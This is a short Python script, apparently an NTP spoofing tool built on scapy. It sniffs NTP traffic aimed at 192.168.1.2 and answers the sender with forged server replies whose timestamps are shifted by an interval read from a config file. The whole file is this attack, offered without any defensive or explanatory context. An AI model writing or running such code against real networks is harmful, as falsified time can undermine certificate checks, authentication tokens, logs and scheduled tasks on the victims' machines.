from scapy.all import *
from scapy.layers.inet import IP, UDP
from scapy.layers.ntp import NTPHeader
import configparser


config = configparser.ConfigParser()
config.read('config.ini')
time_lie_interval = int(config['Settings']['interval'])


def on_packet_receive(pkt):
    if pkt.haslayer(IP) and pkt[IP].dst == '192.168.1.2' and \
            pkt.haslayer(NTPHeader):
        ntp_header = pkt[NTPHeader]
        send(IP(dst=pkt[IP].src) / UDP(dport=123) /
             NTPHeader(
                 leap=ntp_header.leap,
                 version=ntp_header.version,
                 mode=4,
                 stratum=ntp_header.stratum,
                 poll=ntp_header.poll,
                 precision=ntp_header.precision,
                 delay=ntp_header.delay,
                 dispersion=ntp_header.dispersion,
                 id=ntp_header.id,
                 ref=ntp_header.ref,
                 orig=ntp_header.orig + time_lie_interval,
                 recv=ntp_header.recv,
                 sent=ntp_header.sent + time_lie_interval))


if __name__ == '__main__':
    sniff(filter='udp port 123', store=0, prn=on_packet_receive)
